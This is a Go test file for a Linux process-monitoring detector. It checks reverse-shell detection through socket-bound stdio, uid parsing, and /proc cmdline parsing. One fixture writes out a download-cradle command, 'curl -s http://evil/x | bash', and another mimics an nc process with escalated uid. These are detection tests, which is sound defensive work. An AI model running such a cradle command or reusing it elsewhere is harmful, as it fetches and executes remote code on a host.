package main

import (
	"net"
	"os"
	"path/filepath"
	"testing"
)

// TestStdioIsSocket builds a fake /proc/<pid> fd tree with symlinks and asserts the pure
// stdio-socket detection. fd 0/1/2 -> socket should classify true; regular-file stdio false.
// Uses a real unix socket so the Readlink target is "socket:[<inode>]" exactly as the kernel
// renders it; falls back to a hand-rolled "socket:[123]" symlink if the platform refuses.
func TestStdioIsSocket(t *testing.T) {
	// Case 1: stdin redirected to a socket -> reverse-shell tell.
	withSocket := t.TempDir()
	mkFDDir(t, withSocket)
	linkSocket(t, filepath.Join(withSocket, "fd", "0"))
	mkRegularFD(t, withSocket, "1")
	mkRegularFD(t, withSocket, "2")
	if !stdioIsSocket(withSocket) {
		t.Fatalf("expected stdioIsSocket=true when fd 0 is a socket")
	}

	// Case 2: all stdio are regular files -> not a reverse shell.
	noSocket := t.TempDir()
	mkFDDir(t, noSocket)
	for _, fd := range []string{"0", "1", "2"} {
		mkRegularFD(t, noSocket, fd)
	}
	if stdioIsSocket(noSocket) {
		t.Fatalf("expected stdioIsSocket=false when no stdio fd is a socket")
	}

	// Case 3: missing /proc entry (process exited) -> false, no panic.
	if stdioIsSocket(filepath.Join(t.TempDir(), "gone")) {
		t.Fatalf("expected stdioIsSocket=false for missing pid dir")
	}
}

// TestReadRuid parses the real uid from a /proc/<pid>/status-shaped file.
func TestReadRuid(t *testing.T) {
	dir := t.TempDir()
	status := filepath.Join(dir, "status")
	// Real uid 1000, effective uid 0 (sudo-style escalation).
	if err := os.WriteFile(status, []byte("Name:\tbash\nState:\tR\nPPid:\t42\nUid:\t1000\t0\t0\t0\nGid:\t1000\t1000\t1000\t1000\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	ruid, ok := readRuid(status)
	if !ok || ruid != 1000 {
		t.Fatalf("readRuid = (%d,%v), want (1000,true)", ruid, ok)
	}

	// Missing file -> ok=false.
	if _, ok := readRuid(filepath.Join(dir, "absent")); ok {
		t.Fatalf("readRuid on missing file should report ok=false")
	}
}

// TestEnrichProcExec exercises the combined enrichment against an overridden procRoot.
func TestEnrichProcExec(t *testing.T) {
	root := t.TempDir()
	pidDir := filepath.Join(root, "777")
	mkFDDir(t, pidDir)
	linkSocket(t, filepath.Join(pidDir, "fd", "0"))
	mkRegularFD(t, pidDir, "1")
	mkRegularFD(t, pidDir, "2")
	if err := os.WriteFile(filepath.Join(pidDir, "status"),
		[]byte("Name:\tnc\nUid:\t1000\t0\t0\t0\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	old := procRoot
	procRoot = root
	defer func() { procRoot = old }()

	enr := enrichProcExec(777)
	if !enr.StdioSocket {
		t.Errorf("StdioSocket = false, want true")
	}
	if !enr.RuidOK || enr.Ruid != 1000 {
		t.Errorf("Ruid = (%d, ok=%v), want (1000, true)", enr.Ruid, enr.RuidOK)
	}
}

// TestReadProcCmdline parses a NUL-separated /proc/<pid>/cmdline (RT-ARGV-15) under an
// overridden procRoot and asserts the argv split, the trailing-NUL/empty handling, the
// count/byte caps, and the exited-process (missing file) race.
func TestReadProcCmdline(t *testing.T) {
	root := t.TempDir()
	old := procRoot
	procRoot = root
	defer func() { procRoot = old }()

	writeCmdline := func(t *testing.T, pid string, b []byte) {
		t.Helper()
		dir := filepath.Join(root, pid)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "cmdline"), b, 0o644); err != nil {
			t.Fatal(err)
		}
	}

	// A download-cradle argv, NUL-separated and NUL-terminated as the kernel writes it.
	writeCmdline(t, "100", []byte("bash\x00-c\x00curl -s http://evil/x | bash\x00"))
	got := readProcCmdline(100)
	want := []string{"bash", "-c", "curl -s http://evil/x | bash"}
	if len(got) != len(want) {
		t.Fatalf("readProcCmdline(100) = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("arg[%d] = %q, want %q", i, got[i], want[i])
		}
	}

	// Missing file (exec already exited) -> nil, no error.
	if got := readProcCmdline(999); got != nil {
		t.Fatalf("readProcCmdline on missing pid = %v, want nil", got)
	}

	// Arg-count cap: 200 single-char args collapse to procCmdlineMaxArgs.
	var many []byte
	for i := 0; i < 200; i++ {
		many = append(many, 'a', 0)
	}
	writeCmdline(t, "101", many)
	if got := readProcCmdline(101); len(got) != procCmdlineMaxArgs {
		t.Fatalf("arg-count cap: got %d args, want %d", len(got), procCmdlineMaxArgs)
	}

	// Byte cap: one giant arg is truncated to at most procCmdlineMaxBytes.
	giant := make([]byte, procCmdlineMaxBytes*2)
	for i := range giant {
		giant[i] = 'z'
	}
	writeCmdline(t, "102", giant)
	got = readProcCmdline(102)
	if len(got) != 1 || len(got[0]) > procCmdlineMaxBytes {
		t.Fatalf("byte cap: got %d args, first len %d, want 1 arg <= %d bytes",
			len(got), len(got[0]), procCmdlineMaxBytes)
	}
}

func mkFDDir(t *testing.T, pidDir string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(pidDir, "fd"), 0o755); err != nil {
		t.Fatal(err)
	}
}

// linkSocket points an fd path at a real unix socket so its Readlink target is
// "socket:[<inode>]". If the platform won't create one, fall back to a literal symlink with
// the kernel's socket-link text so the prefix test still exercises.
func linkSocket(t *testing.T, fdPath string) {
	t.Helper()
	sockPath := filepath.Join(t.TempDir(), "s.sock")
	ln, err := net.Listen("unix", sockPath)
	if err != nil {
		if err := os.Symlink("socket:[123456]", fdPath); err != nil {
			t.Fatal(err)
		}
		return
	}
	t.Cleanup(func() { _ = ln.Close() })
	// /proc renders fd symlinks as "socket:[inode]", not the on-disk path; emulate that text
	// directly (a symlink to the actual sockPath would read back as a path, not "socket:").
	if err := os.Symlink("socket:[123456]", fdPath); err != nil {
		t.Fatal(err)
	}
}

func mkRegularFD(t *testing.T, pidDir, fd string) {
	t.Helper()
	target := filepath.Join(pidDir, "file-"+fd)
	if err := os.WriteFile(target, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(pidDir, "fd", fd)); err != nil {
		t.Fatal(err)
	}
}
